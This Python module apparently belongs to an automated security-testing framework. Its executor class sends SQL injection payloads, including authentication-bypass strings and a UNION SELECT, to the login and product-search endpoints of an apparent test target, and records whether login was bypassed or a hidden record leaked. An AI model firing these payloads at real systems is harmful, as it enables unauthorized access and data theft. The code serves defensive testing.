"""Executor agent: runs the attack against the target and records every request.

No LLM is involved. Attack success is decided by inspecting the target's response, so the
result is reproducible and independent of any model's opinion.
"""

import time

import httpx

from ..schemas import AttackPlan, AttackType, AttemptResult, ExecutionResult
from ..target_facts import SECRET_PRODUCT

SQLI_LOGIN_PAYLOADS = [
    "' OR '1'='1' --",
    "admin' --",
    "' OR 1=1 --",
    "') OR ('1'='1",
]

SQLI_SEARCH_PAYLOADS = [
    "' OR '1'='1' --",
    "%' OR '1'='1' --",
    "nope' UNION SELECT name FROM products --",
]

WRONG_PASSWORD = "not-the-password-42"


class ExecutorAgent:
    def __init__(self, client: httpx.Client):
        self.client = client

    def run(self, plan: AttackPlan, iteration: int) -> ExecutionResult:
        started = time.perf_counter()
        if plan.attack_type == AttackType.SQL_INJECTION:
            attempts = self._sql_injection(plan.target_endpoint)
        else:
            raise NotImplementedError(f"Executor does not yet support {plan.attack_type.value}")
        return ExecutionResult(
            iteration=iteration,
            attack_type=plan.attack_type,
            target_endpoint=plan.target_endpoint,
            attempts=attempts,
            duration_s=time.perf_counter() - started,
        )

    def _sql_injection(self, endpoint: str) -> list[AttemptResult]:
        path = endpoint.split("?")[0]
        if path == "/products":
            return [self._inject_search(path, payload) for payload in SQLI_SEARCH_PAYLOADS]
        return [self._inject_login(payload) for payload in SQLI_LOGIN_PAYLOADS]

    def _inject_login(self, payload: str) -> AttemptResult:
        started = time.perf_counter()
        response = self.client.post("/login", data={"username": payload, "password": WRONG_PASSWORD})
        latency_ms = (time.perf_counter() - started) * 1000
        body = _json(response)
        authenticated = body.get("authenticated") is True
        return AttemptResult(
            payload=f"username={payload}",
            status_code=response.status_code,
            succeeded=authenticated,
            evidence=_login_evidence(authenticated, body),
            latency_ms=latency_ms,
        )

    def _inject_search(self, path: str, payload: str) -> AttemptResult:
        started = time.perf_counter()
        response = self.client.get(path, params={"q": payload})
        latency_ms = (time.perf_counter() - started) * 1000
        body = _json(response)
        leaked = SECRET_PRODUCT in body.get("products", [])
        return AttemptResult(
            payload=f"q={payload}",
            status_code=response.status_code,
            succeeded=leaked,
            evidence=_search_evidence(leaked, body),
            latency_ms=latency_ms,
        )


def _json(response: httpx.Response) -> dict:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}


def _login_evidence(authenticated: bool, body: dict) -> str:
    if authenticated:
        return f"authentication bypassed, logged in as {body.get('user')}"
    if body.get("blocked"):
        return f"request blocked by {body['blocked']}"
    return "login rejected"


def _search_evidence(leaked: bool, body: dict) -> str:
    if leaked:
        return f"leaked hidden record {SECRET_PRODUCT}"
    if body.get("blocked"):
        return f"request blocked by {body['blocked']}"
    return "no hidden data returned"
